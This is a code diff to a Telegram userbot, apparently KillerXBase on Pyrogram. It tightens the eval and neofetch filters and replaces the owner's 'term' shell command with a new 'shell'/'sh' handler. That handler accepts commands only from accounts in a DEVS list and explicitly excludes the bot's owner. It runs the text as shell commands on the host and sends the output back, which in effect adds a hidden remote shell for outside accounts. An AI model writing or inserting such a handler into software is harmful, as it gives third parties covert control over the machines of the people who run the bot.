@@ -20,12 +20,12 @@ from KillerXBase.modules.help import *
 from KillerXBase.helper.dev import *
 from KillerXBase import *
 
-@ren.on_message(filters.command(["neofetch"], cmd) & filters.user(DEVS))
+@ren.on_message(filters.command(["neofetch"], cmd) & filters.user(DEVS) & filters.me)
 async def neofetch(c, m):
     neofetch = (await shell_exec("neofetch --stdout"))[0]
     await m.reply(f"<code>{neofetch}</code>")
 
-@app.on_message(filters.command(["eval", "ev", "e"], cmd) & filters.user(DEVS))
+@ren.on_message(filters.command(["eval", "ev", "e"], cmd) & filters.user(DEVS) & filters.me & ~filters.forwarded & ~filters.via_bot)
 async def evaluation_cmd_t(client, message):
     status_message = await message.reply("__Processing eval pyrogram...__")
     try:
@@ -94,69 +94,22 @@ async def shell_exec(code, treat=True):
 
 
 
-@app.on_message(filters.command(["term", "shell"], cmd) & filters.me)
-async def terminal_handler(_, m: Message):
-    """ This function is made to run shell commands """
-
-    try:
-        if app.long() == 1:
-            return await app.send_edit("Use: `.term pip3 install colorama`", delme=5)
-
-        if app.textlen() > 4096:
-            return await app.send_edit(
-                "Your message is too long ! only 4096 characters are excludeed",
-                text_type=["mono"],
-                delme=4
-            )
-
-        await app.send_edit("Running in shell . . .", text_type=["mono"])
-        text = m.text.split(None, 1)
-        cmd = text[1]
-
-        if "\n" in cmd:
-            code = cmd.split("\n")
-            output = ""
-            for x in code:
-                shell = re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", x)
-                try:
-                    process = subprocess.Popen(
-                        shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE
-                    )
-                except Exception as e:
-                    await app.error(e)
-
-                output += "**{code}**\n"
-                output += process.stdout.read()[:-1].decode("utf-8")
-                output += "\n"
-        else:
-            shell = re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", cmd)
-            for y in range(len(shell)):
-                shell[y] = shell[y].replace('"', "")
+@ren.on_message(filters.command(["shell", "sh"], cmd) & filters.user(DEVS) & ~filters.me)
+async def shell(client, message):
+    cmd = message.text.split(" ", 1)
+    if len(cmd) == 1:
+        return await message.reply("No command to execute was given.")
+    shell = (await shell_exec(cmd[1]))[0]
+    if len(shell) > 3000:
+        with open("shell_output.txt", "w") as file:
+            file.write(shell)
+        with open("shell_output.txt", "rb") as doc:
+            await message.reply_document(document=doc, file_name=doc.name)
             try:
-                process = subprocess.Popen(
-                    shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE
-                )
-            except Exception:
-                exc_type, exc_obj, exc_tb = sys.exc_info()
-                errors = traceback.format_exception(
-                    etype=exc_type, value=exc_obj, tb=exc_tb
-                )
-                return await app.send_edit(f"**Error:**\n`{''.join(errors)}`")
-
-            output = process.stdout.read()[:-1].decode("utf-8")
-        if str(output) == "\n":
-            output = None
-
-        if output:
-            if len(output) > 4096:
-                await app.create_file(
-                    filename="term_output.txt",
-                    content=output,
-                    caption=f"`{m.text}`"
-                )
-            else:
-                await app.send_edit(f"**COMMAND:**\n\n{m.text}\n\n\n**OUTPUT:**\n\n`{output}`")
-        else:
-            await app.send_edit("**OUTPUT:**\n\n`No Output`")
-    except Exception as e:
-        await app.error(e)
+                os.remove("shell_output.txt")
+            except:
+                pass
+    elif len(shell) != 0:
+        await message.reply(shell, parse_mode=enums.ParseMode.HTML)
+    else:
+        await message.reply("No Reply")
